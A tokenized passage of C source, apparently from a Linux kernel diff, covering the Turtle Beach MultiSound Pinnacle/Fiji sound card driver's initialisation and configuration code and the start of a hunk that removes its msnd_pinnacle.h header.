"mixer_minor", ";", "}", "dev", ".", "ext_midi_dev", "=", "dev", ".", "hdr_midi_dev", "=", "-", "1", ";", "disable_irq", "(", "dev", ".", "irq", ")", ";", "calibrate_adc", "(", "dev", ".", "play_sample_rate", ")", ";", "#", "ifndef", "MSND_CLASSIC", "force_recsrc", "(", "SOUND_MASK_IMIX", ")", ";", "#", "endif", "return", "0", ";", "}", "static", "void", "__exit", "unload_multisound", "(", "void", ")", "{", "release_region", "(", "dev", ".", "io", ",", "dev", ".", "numio", ")", ";", "free_irq", "(", "dev", ".", "irq", ",", "&", "dev", ")", ";", "unregister_sound_mixer", "(", "dev", ".", "mixer_minor", ")", ";", "unregister_sound_dsp", "(", "dev", ".", "dsp_minor", ")", ";", "msnd_unregister", "(", "&", "dev", ")", ";", "}", "#", "ifndef", "MSND_CLASSIC", "/", "*", "Pinnacle", "/", "Fiji", "Logical", "Device", "Configuration", "*", "/", "static", "int", "__init", "msnd_write_cfg", "(", "int", "cfg", ",", "int", "reg", ",", "int", "value", ")", "{", "msnd_outb", "(", "reg", ",", "cfg", ")", ";", "msnd_outb", "(", "value", ",", "cfg", "+", "1", ")", ";", "if", "(", "value", "!", "=", "msnd_inb", "(", "cfg", "+", "1", ")", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "msnd_write_cfg", ":", "I", "/", "O", "error", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "return", "0", ";", "}", "static", "int", "__init", "msnd_write_cfg_io0", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io", ")", "{", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO0_BASEHI", ",", "HIBYTE", "(", "io", ")", "))", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO0_BASELO", ",", "LOBYTE", "(", "io", ")", "))", "return", "-", "EIO", ";", "return", "0", ";", "}", "static", "int", "__init", "msnd_write_cfg_io1", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io", ")", "{", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO1_BASEHI", ",", "HIBYTE", "(", "io", ")", "))", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IO1_BASELO", ",", "LOBYTE", "(", "io", ")", "))", "return", "-", "EIO", ";", "return", "0", ";", "}", "static", "int", "__init", "msnd_write_cfg_irq", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "irq", ")", "{", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IRQ_NUMBER", ",", "LOBYTE", "(", "irq", ")", "))", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_IRQ_TYPE", ",", "IRQTYPE_EDGE", ")", ")", "return", "-", "EIO", ";", "return", "0", ";", "}", "static", "int", "__init", "msnd_write_cfg_mem", "(", "int", "cfg", ",", "int", "num", ",", "int", "mem", ")", "{", "WORD", "wmem", ";", "mem", ">", ">=", "8", ";", "mem", "&", "=", "0xfff", ";", "wmem", "=", "(", "WORD", ")", "mem", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMBASEHI", ",", "HIBYTE", "(", "wmem", ")", "))", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMBASELO", ",", "LOBYTE", "(", "wmem", ")", "))", "return", "-", "EIO", ";", "if", "(", "wmem", "&", "&", "msnd_write_cfg", "(", "cfg", ",", "IREG_MEMCONTROL", ",", "(", "MEMTYPE_HIADDR", "|", "MEMTYPE_16BIT", ")", "))", "return", "-", "EIO", ";", "return", "0", ";", "}", "static", "int", "__init", "msnd_activate_logical", "(", "int", "cfg", ",", "int", "num", ")", "{", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_ACTIVATE", ",", "LD_ACTIVATE", ")", ")", "return", "-", "EIO", ";", "return", "0", ";", "}", "static", "int", "__init", "msnd_write_cfg_logical", "(", "int", "cfg", ",", "int", "num", ",", "WORD", "io0", ",", "WORD", "io1", ",", "WORD", "irq", ",", "int", "mem", ")", "{", "if", "(", "msnd_write_cfg", "(", "cfg", ",", "IREG_LOGDEVICE", ",", "num", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg_io0", "(", "cfg", ",", "num", ",", "io0", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg_io1", "(", "cfg", ",", "num", ",", "io1", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg_irq", "(", "cfg", ",", "num", ",", "irq", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_write_cfg_mem", "(", "cfg", ",", "num", ",", "mem", ")", ")", "return", "-", "EIO", ";", "if", "(", "msnd_activate_logical", "(", "cfg", ",", "num", ")", ")", "return", "-", "EIO", ";", "return", "0", ";", "}", "typedef", "struct", "msnd_pinnacle_cfg_device", "{", "WORD", "io0", ",", "io1", ",", "irq", ";", "int", "mem", ";", "}", "msnd_pinnacle_cfg_t", "[", "4", "]", ";", "static", "int", "__init", "msnd_pinnacle_cfg_devices", "(", "int", "cfg", ",", "int", "reset", ",", "msnd_pinnacle_cfg_t", "device", ")", "{", "int", "i", ";", "/", "*", "Reset", "devices", "if", "told", "to", "*", "/", "if", "(", "reset", ")", "{", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Resetting", "all", "devices", "\\", "n", "\"", ");", "for", "(", "i", "=", "0", ";", "i", "<", "4", ";", "+", "+", "i", ")", "if", "(", "msnd_write_cfg_logical", "(", "cfg", ",", "i", ",", "0", ",", "0", ",", "0", ",", "0", ")", ")", "return", "-", "EIO", ";", "}", "/", "*", "Configure", "specified", "devices", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "4", ";", "+", "+", "i", ")", "{", "switch", "(", "i", ")", "{", "case", "0", ":", "/", "*", "DSP", "*", "/", "if", "(", "!(", "device", "[", "i", "]", ".", "io0", "&", "&", "device", "[", "i", "]", ".", "irq", "&", "&", "device", "[", "i", "]", ".", "mem", ")", ")", "continue", ";", "break", ";", "case", "1", ":", "/", "*", "MPU", "*", "/", "if", "(", "!(", "device", "[", "i", "]", ".", "io0", "&", "&", "device", "[", "i", "]", ".", "irq", ")", ")", "continue", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Configuring", "MPU", "to", "I", "/", "O", "0x", "%", "x", "IRQ", "%", "d", "\\", "n", "\"", ",", "device", "[", "i", "]", ".", "io0", ",", "device", "[", "i", "]", ".", "irq", ")", ";", "break", ";", "case", "2", ":", "/", "*", "IDE", "*", "/", "if", "(", "!(", "device", "[", "i", "]", ".", "io0", "&", "&", "device", "[", "i", "]", ".", "io1", "&", "&", "device", "[", "i", "]", ".", "irq", ")", ")", "continue", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Configuring", "IDE", "to", "I", "/", "O", "0x", "%", "x", ",", "0x", "%", "x", "IRQ", "%", "d", "\\", "n", "\"", ",", "device", "[", "i", "]", ".", "io0", ",", "device", "[", "i", "]", ".", "io1", ",", "device", "[", "i", "]", ".", "irq", ")", ";", "break", ";", "case", "3", ":", "/", "*", "Joystick", "*", "/", "if", "(", "!(", "device", "[", "i", "]", ".", "io0", ")", ")", "continue", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Configuring", "joystick", "to", "I", "/", "O", "0x", "%", "x", "\\", "n", "\"", ",", "device", "[", "i", "]", ".", "io0", ")", ";", "break", ";", "}", "/", "*", "Configure", "the", "device", "*", "/", "if", "(", "msnd_write_cfg_logical", "(", "cfg", ",", "i", ",", "device", "[", "i", "]", ".", "io0", ",", "device", "[", "i", "]", ".", "io1", ",", "device", "[", "i", "]", ".", "irq", ",", "device", "[", "i", "]", ".", "mem", ")", ")", "return", "-", "EIO", ";", "}", "return", "0", ";", "}", "#", "endif", "#", "ifdef", "MODULE", "MODULE_AUTHOR", "(", "\"", "Andrew", "Veliath", "<", "andrewtv", "@", "usa", ".", "net", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Turtle", "Beach", "\"", "LONGNAME", "\"", "Linux", "Driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "static", "int", "io", "__initdata", "=", "-", "1", ";", "static", "int", "irq", "__initdata", "=", "-", "1", ";", "static", "int", "mem", "__initdata", "=", "-", "1", ";", "static", "int", "write_ndelay", "__initdata", "=", "-", "1", ";", "#", "ifndef", "MSND_CLASSIC", "/", "*", "Pinnacle", "/", "Fiji", "non", "-", "PnP", "Config", "Port", "*", "/", "static", "int", "cfg", "__initdata", "=", "-", "1", ";", "/", "*", "Extra", "Peripheral", "Configuration", "*", "/", "static", "int", "reset", "__initdata", "=", "0", ";", "static", "int", "mpu_io", "__initdata", "=", "0", ";", "static", "int", "mpu_irq", "__initdata", "=", "0", ";", "static", "int", "ide_io0", "__initdata", "=", "0", ";", "static", "int", "ide_io1", "__initdata", "=", "0", ";", "static", "int", "ide_irq", "__initdata", "=", "0", ";", "static", "int", "joystick_io", "__initdata", "=", "0", ";", "/", "*", "If", "we", "have", "the", "digital", "daugherboard", ".", "..", "*", "/", "static", "bool", "digital", "__initdata", "=", "false", ";", "#", "endif", "static", "int", "fifosize", "__initdata", "=", "DEFFIFOSIZE", ";", "static", "int", "calibrate_signal", "__initdata", "=", "0", ";", "#", "else", "/", "*", "not", "a", "module", "*", "/", "static", "int", "write_ndelay", "__initdata", "=", "-", "1", ";", "#", "ifdef", "MSND_CLASSIC", "static", "int", "io", "__initdata", "=", "CONFIG_MSNDCLAS_IO", ";", "static", "int", "irq", "__initdata", "=", "CONFIG_MSNDCLAS_IRQ", ";", "static", "int", "mem", "__initdata", "=", "CONFIG_MSNDCLAS_MEM", ";", "#", "else", "/", "*", "Pinnacle", "/", "Fiji", "*", "/", "static", "int", "io", "__initdata", "=", "CONFIG_MSNDPIN_IO", ";", "static", "int", "irq", "__initdata", "=", "CONFIG_MSNDPIN_IRQ", ";", "static", "int", "mem", "__initdata", "=", "CONFIG_MSNDPIN_MEM", ";", "/", "*", "Pinnacle", "/", "Fiji", "non", "-", "PnP", "Config", "Port", "*", "/", "#", "ifdef", "CONFIG_MSNDPIN_NONPNP", "#", "ifndef", "CONFIG_MSNDPIN_CFG", "#", "define", "CONFIG_MSNDPIN_CFG", "0x250", "#", "endif", "#", "else", "#", "ifdef", "CONFIG_MSNDPIN_CFG", "#", "undef", "CONFIG_MSNDPIN_CFG", "#", "endif", "#", "define", "CONFIG_MSNDPIN_CFG", "-", "1", "#", "endif", "static", "int", "cfg", "__initdata", "=", "CONFIG_MSNDPIN_CFG", ";", "/", "*", "If", "not", "a", "module", ",", "we", "don", "'", "t", "need", "to", "bother", "with", "reset", "=", "1", "*", "/", "static", "int", "reset", ";", "/", "*", "Extra", "Peripheral", "Configuration", "(", "Default", ":", "Disable", ")", "*", "/", "#", "ifndef", "CONFIG_MSNDPIN_MPU_IO", "#", "define", "CONFIG_MSNDPIN_MPU_IO", "0", "#", "endif", "static", "int", "mpu_io", "__initdata", "=", "CONFIG_MSNDPIN_MPU_IO", ";", "#", "ifndef", "CONFIG_MSNDPIN_MPU_IRQ", "#", "define", "CONFIG_MSNDPIN_MPU_IRQ", "0", "#", "endif", "static", "int", "mpu_irq", "__initdata", "=", "CONFIG_MSNDPIN_MPU_IRQ", ";", "#", "ifndef", "CONFIG_MSNDPIN_IDE_IO0", "#", "define", "CONFIG_MSNDPIN_IDE_IO0", "0", "#", "endif", "static", "int", "ide_io0", "__initdata", "=", "CONFIG_MSNDPIN_IDE_IO0", ";", "#", "ifndef", "CONFIG_MSNDPIN_IDE_IO1", "#", "define", "CONFIG_MSNDPIN_IDE_IO1", "0", "#", "endif", "static", "int", "ide_io1", "__initdata", "=", "CONFIG_MSNDPIN_IDE_IO1", ";", "#", "ifndef", "CONFIG_MSNDPIN_IDE_IRQ", "#", "define", "CONFIG_MSNDPIN_IDE_IRQ", "0", "#", "endif", "static", "int", "ide_irq", "__initdata", "=", "CONFIG_MSNDPIN_IDE_IRQ", ";", "#", "ifndef", "CONFIG_MSNDPIN_JOYSTICK_IO", "#", "define", "CONFIG_MSNDPIN_JOYSTICK_IO", "0", "#", "endif", "static", "int", "joystick_io", "__initdata", "=", "CONFIG_MSNDPIN_JOYSTICK_IO", ";", "/", "*", "Have", "SPDIF", "(", "Digital", ")", "Daughterboard", "*", "/", "#", "ifndef", "CONFIG_MSNDPIN_DIGITAL", "#", "define", "CONFIG_MSNDPIN_DIGITAL", "0", "#", "endif", "static", "bool", "digital", "__initdata", "=", "CONFIG_MSNDPIN_DIGITAL", ";", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "#", "ifndef", "CONFIG_MSND_FIFOSIZE", "#", "define", "CONFIG_MSND_FIFOSIZE", "DEFFIFOSIZE", "#", "endif", "static", "int", "fifosize", "__initdata", "=", "CONFIG_MSND_FIFOSIZE", ";", "#", "ifndef", "CONFIG_MSND_CALSIGNAL", "#", "define", "CONFIG_MSND_CALSIGNAL", "0", "#", "endif", "static", "int", "calibrate_signal", "__initdata", "=", "CONFIG_MSND_CALSIGNAL", ";", "#", "endif", "/", "*", "MODULE", "*", "/", "module_param_hw", "(", "io", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "mem", ",", "int", ",", "iomem", ",", "0", ")", ";", "module_param", "(", "write_ndelay", ",", "int", ",", "0", ")", ";", "module_param", "(", "fifosize", ",", "int", ",", "0", ")", ";", "module_param", "(", "calibrate_signal", ",", "int", ",", "0", ")", ";", "#", "ifndef", "MSND_CLASSIC", "module_param", "(", "digital", ",", "bool", ",", "0", ")", ";", "module_param_hw", "(", "cfg", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param", "(", "reset", ",", "int", ",", "0", ")", ";", "module_param_hw", "(", "mpu_io", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "mpu_irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "ide_io0", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "ide_io1", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "ide_irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "joystick_io", ",", "int", ",", "ioport", ",", "0", ")", ";", "#", "endif", "static", "int", "__init", "msnd_init", "(", "void", ")", "{", "int", "err", ";", "#", "ifndef", "MSND_CLASSIC", "static", "msnd_pinnacle_cfg_t", "pinnacle_devs", ";", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Turtle", "Beach", "\"", "LONGNAME", "\"", "Linux", "Driver", "Version", "\"", "VERSION", "\"", ",", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "\\", "n", "\"", ");", "if", "(", "io", "=", "=", "-", "1", "|", "|", "irq", "=", "=", "-", "1", "|", "|", "mem", "=", "=", "-", "1", ")", "printk", "(", "KERN_WARNING", "LOGNAME", "\"", ":", "io", ",", "irq", "and", "mem", "must", "be", "set", "\\", "n", "\"", ");", "#", "ifdef", "MSND_CLASSIC", "if", "(", "io", "=", "=", "-", "1", "|", "|", "!", "(", "io", "=", "=", "0x290", "|", "|", "io", "=", "=", "0x260", "|", "|", "io", "=", "=", "0x250", "|", "|", "io", "=", "=", "0x240", "|", "|", "io", "=", "=", "0x230", "|", "|", "io", "=", "=", "0x220", "|", "|", "io", "=", "=", "0x210", "|", "|", "io", "=", "=", "0x3e0", ")", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "\\", "\"", "io", "\\", "\"", "-", "DSP", "I", "/", "O", "base", "must", "be", "set", "to", "0x210", ",", "0x220", ",", "0x230", ",", "0x240", ",", "0x250", ",", "0x260", ",", "0x290", ",", "or", "0x3E0", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "#", "else", "if", "(", "io", "=", "=", "-", "1", "|", "|", "io", "<", "0x100", "|", "|", "io", ">", "0x3e0", "|", "|", "(", "io", "%", "0x10", ")", "!", "=", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "\\", "\"", "io", "\\", "\"", "-", "DSP", "I", "/", "O", "base", "must", "within", "the", "range", "0x100", "to", "0x3E0", "and", "must", "be", "evenly", "divisible", "by", "0x10", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "if", "(", "irq", "=", "=", "-", "1", "|", "|", "!", "(", "irq", "=", "=", "5", "|", "|", "irq", "=", "=", "7", "|", "|", "irq", "=", "=", "9", "|", "|", "irq", "=", "=", "10", "|", "|", "irq", "=", "=", "11", "|", "|", "irq", "=", "=", "12", ")", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "\\", "\"", "irq", "\\", "\"", "-", "must", "be", "set", "to", "5", ",", "7", ",", "9", ",", "10", ",", "11", "or", "12", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "if", "(", "mem", "=", "=", "-", "1", "|", "|", "!", "(", "mem", "=", "=", "0xb0000", "|", "|", "mem", "=", "=", "0xc8000", "|", "|", "mem", "=", "=", "0xd0000", "|", "|", "mem", "=", "=", "0xd8000", "|", "|", "mem", "=", "=", "0xe0000", "|", "|", "mem", "=", "=", "0xe8000", ")", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "\\", "\"", "mem", "\\", "\"", "-", "must", "be", "set", "to", "\"", "\"", "0xb0000", ",", "0xc8000", ",", "0xd0000", ",", "0xd8000", ",", "0xe0000", "or", "0xe8000", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "#", "ifdef", "MSND_CLASSIC", "switch", "(", "irq", ")", "{", "case", "5", ":", "dev", ".", "irqid", "=", "HPIRQ_5", ";", "break", ";", "case", "7", ":", "dev", ".", "irqid", "=", "HPIRQ_7", ";", "break", ";", "case", "9", ":", "dev", ".", "irqid", "=", "HPIRQ_9", ";", "break", ";", "case", "10", ":", "dev", ".", "irqid", "=", "HPIRQ_10", ";", "break", ";", "case", "11", ":", "dev", ".", "irqid", "=", "HPIRQ_11", ";", "break", ";", "case", "12", ":", "dev", ".", "irqid", "=", "HPIRQ_12", ";", "break", ";", "}", "switch", "(", "mem", ")", "{", "case", "0xb0000", ":", "dev", ".", "memid", "=", "HPMEM_B000", ";", "break", ";", "case", "0xc8000", ":", "dev", ".", "memid", "=", "HPMEM_C800", ";", "break", ";", "case", "0xd0000", ":", "dev", ".", "memid", "=", "HPMEM_D000", ";", "break", ";", "case", "0xd8000", ":", "dev", ".", "memid", "=", "HPMEM_D800", ";", "break", ";", "case", "0xe0000", ":", "dev", ".", "memid", "=", "HPMEM_E000", ";", "break", ";", "case", "0xe8000", ":", "dev", ".", "memid", "=", "HPMEM_E800", ";", "break", ";", "}", "#", "else", "if", "(", "cfg", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Assuming", "PnP", "mode", "\\", "n", "\"", ");", "}", "else", "if", "(", "cfg", "!", "=", "0x250", "&", "&", "cfg", "!", "=", "0x260", "&", "&", "cfg", "!", "=", "0x270", ")", "{", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Config", "port", "must", "be", "0x250", ",", "0x260", "or", "0x270", "(", "or", "unspecified", "for", "PnP", "mode", ")", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "else", "{", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "Non", "-", "PnP", "mode", ":", "configuring", "at", "port", "0x", "%", "x", "\\", "n", "\"", ",", "cfg", ")", ";", "/", "*", "DSP", "*", "/", "pinnacle_devs", "[", "0", "]", ".", "io0", "=", "io", ";", "pinnacle_devs", "[", "0", "]", ".", "irq", "=", "irq", ";", "pinnacle_devs", "[", "0", "]", ".", "mem", "=", "mem", ";", "/", "*", "The", "following", "are", "Pinnacle", "specific", "*", "/", "/", "*", "MPU", "*", "/", "pinnacle_devs", "[", "1", "]", ".", "io0", "=", "mpu_io", ";", "pinnacle_devs", "[", "1", "]", ".", "irq", "=", "mpu_irq", ";", "/", "*", "IDE", "*", "/", "pinnacle_devs", "[", "2", "]", ".", "io0", "=", "ide_io0", ";", "pinnacle_devs", "[", "2", "]", ".", "io1", "=", "ide_io1", ";", "pinnacle_devs", "[", "2", "]", ".", "irq", "=", "ide_irq", ";", "/", "*", "Joystick", "*", "/", "pinnacle_devs", "[", "3", "]", ".", "io0", "=", "joystick_io", ";", "if", "(", "!", "request_region", "(", "cfg", ",", "2", ",", "\"", "Pinnacle", "/", "Fiji", "Config", "\"", "))", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Config", "port", "0x", "%", "x", "conflict", "\\", "n", "\"", ",", "cfg", ")", ";", "return", "-", "EIO", ";", "}", "if", "(", "msnd_pinnacle_cfg_devices", "(", "cfg", ",", "reset", ",", "pinnacle_devs", ")", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Device", "configuration", "error", "\\", "n", "\"", ");", "release_region", "(", "cfg", ",", "2", ")", ";", "return", "-", "EIO", ";", "}", "release_region", "(", "cfg", ",", "2", ")", ";", "}", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "if", "(", "fifosize", "<", "16", ")", "fifosize", "=", "16", ";", "if", "(", "fifosize", ">", "1024", ")", "fifosize", "=", "1024", ";", "set_default_audio_parameters", "(", ");", "#", "ifdef", "MSND_CLASSIC", "dev", ".", "type", "=", "msndClassic", ";", "#", "else", "dev", ".", "type", "=", "msndPinnacle", ";", "#", "endif", "dev", ".", "io", "=", "io", ";", "dev", ".", "numio", "=", "DSP_NUMIO", ";", "dev", ".", "irq", "=", "irq", ";", "dev", ".", "base", "=", "ioremap", "(", "mem", ",", "0x8000", ")", ";", "dev", ".", "fifosize", "=", "fifosize", "*", "1024", ";", "dev", ".", "calibrate_signal", "=", "calibrate_signal", "?", "1", ":", "0", ";", "dev", ".", "recsrc", "=", "0", ";", "dev", ".", "dspq_data_buff", "=", "DSPQ_DATA_BUFF", ";", "dev", ".", "dspq_buff_size", "=", "DSPQ_BUFF_SIZE", ";", "if", "(", "write_ndelay", "=", "=", "-", "1", ")", "write_ndelay", "=", "CONFIG_MSND_WRITE_NDELAY", ";", "if", "(", "write_ndelay", ")", "clear_bit", "(", "F_DISABLE_WRITE_NDELAY", ",", "&", "dev", ".", "flags", ")", ";", "else", "set_bit", "(", "F_DISABLE_WRITE_NDELAY", ",", "&", "dev", ".", "flags", ")", ";", "#", "ifndef", "MSND_CLASSIC", "if", "(", "digital", ")", "set_bit", "(", "F_HAVEDIGITAL", ",", "&", "dev", ".", "flags", ")", ";", "#", "endif", "init_waitqueue_head", "(", "&", "dev", ".", "writeblock", ")", ";", "init_waitqueue_head", "(", "&", "dev", ".", "readblock", ")", ";", "init_waitqueue_head", "(", "&", "dev", ".", "writeflush", ")", ";", "msnd_fifo_init", "(", "&", "dev", ".", "DAPF", ")", ";", "msnd_fifo_init", "(", "&", "dev", ".", "DARF", ")", ";", "spin_lock_init", "(", "&", "dev", ".", "lock", ")", ";", "printk", "(", "KERN_INFO", "LOGNAME", "\"", ":", "%", "u", "byte", "audio", "FIFOs", "(", "x2", ")", "\\", "n", "\"", ",", "dev", ".", "fifosize", ")", ";", "if", "(", "(", "err", "=", "msnd_fifo_alloc", "(", "&", "dev", ".", "DAPF", ",", "dev", ".", "fifosize", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Couldn", "'", "t", "allocate", "write", "FIFO", "\\", "n", "\"", ");", "return", "err", ";", "}", "if", "(", "(", "err", "=", "msnd_fifo_alloc", "(", "&", "dev", ".", "DARF", ",", "dev", ".", "fifosize", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Couldn", "'", "t", "allocate", "read", "FIFO", "\\", "n", "\"", ");", "msnd_fifo_free", "(", "&", "dev", ".", "DAPF", ")", ";", "return", "err", ";", "}", "if", "(", "(", "err", "=", "probe_multisound", "(", "))", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Probe", "failed", "\\", "n", "\"", ");", "msnd_fifo_free", "(", "&", "dev", ".", "DAPF", ")", ";", "msnd_fifo_free", "(", "&", "dev", ".", "DARF", ")", ";", "return", "err", ";", "}", "if", "(", "(", "err", "=", "attach_multisound", "(", "))", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "LOGNAME", "\"", ":", "Attach", "failed", "\\", "n", "\"", ");", "msnd_fifo_free", "(", "&", "dev", ".", "DAPF", ")", ";", "msnd_fifo_free", "(", "&", "dev", ".", "DARF", ")", ";", "return", "err", ";", "}", "return", "0", ";", "}", "static", "void", "__exit", "msdn_cleanup", "(", "void", ")", "{", "unload_multisound", "(", ");", "msnd_fifo_free", "(", "&", "dev", ".", "DAPF", ")", ";", "msnd_fifo_free", "(", "&", "dev", ".", "DARF", ")", ";", "}", "module_init", "(", "msnd_init", ")", ";", "module_exit", "(", "msdn_cleanup", ")", ";", "@", "@", "-", "1", ",", "246", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "msnd_pinnacle", ".", "h", "*", "*", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "*", "*", "Some", "parts", "of", "this", "header", "file", "were", "derived", "from", "the", "Turtle", "Beach", "*", "MultiSound", "Driver", "Development", "Kit", ".", "*", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "*", "Copyright", "(", "C", ")", "1993", "Turtle", "Beach", "Systems", ",", "Inc", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "__MSND_PINNACLE_H", "#", "define", "__MSND_PINNACLE_H", "#", "define", "DSP_NUMIO", "0x08", "#", "define", "IREG_LOGDEVICE", "0x07", "#", "define", "IREG_ACTIVATE", "0x30", "#", "define", "LD_ACTIVATE", "0x01", "#", "define", "LD_DISACTIVATE", "0x00", "#", "define", "IREG_EECONTROL", "0x3F", "#", "define", "IREG_MEMBASEHI", "0x40", "#", "define", "IREG_MEMBASELO", "0x41", "#", "define", "IREG_MEMCONTROL", "0x42", "#", "define", "IREG_MEMRANGEHI", "0x43", "#", "define", "IREG_MEMRANGELO", "0x44", "#", "define", "MEMTYPE_8BIT", "0x00", "#", "define", "MEMTYPE_16BIT", "0x02", "#", "define", "MEMTYPE_RANGE", "0x00", "#", "define", "MEMTYPE_HIADDR", "0x01", "#", "define", "IREG_IO0_BASEHI", "0x60", "#", "define", "IREG_IO0_BASELO", "0x61", "#", "define", "IREG_IO1_BASEHI", "0x62", "#", "define", "IREG_IO1_BASELO", "0x63", "#", "define", "IREG_IRQ_NUMBER", "0x70", "#", "define", "IREG_IRQ_TYPE", "0x71", "#", "define", "IRQTYPE_HIGH", "0x02", "#", "define", "IRQTYPE_LOW", "0x00", "#", "define", "IRQTYPE_LEVEL", "0x01", "#", "define", "IRQTYPE_EDGE", "0x00", "#", "define", "HP_DSPR", "0x04", "#", "define", "HP_BLKS", "0x04", "#", "define", "HPDSPRESET_OFF", "2", "#", "define", "HPDSPRESET_ON", "0", "#", "define", "HPBLKSEL_0", "2", "#", "define", "HPBLKSEL_1", "3", "#", "define", "HIMT_DAT_OFF", "0x03", "#", "define", "HIDSP_PLAY_UNDER", "0x00", "#", "define", "HIDSP_INT_PLAY_UNDER", "0x01", "#", "define", 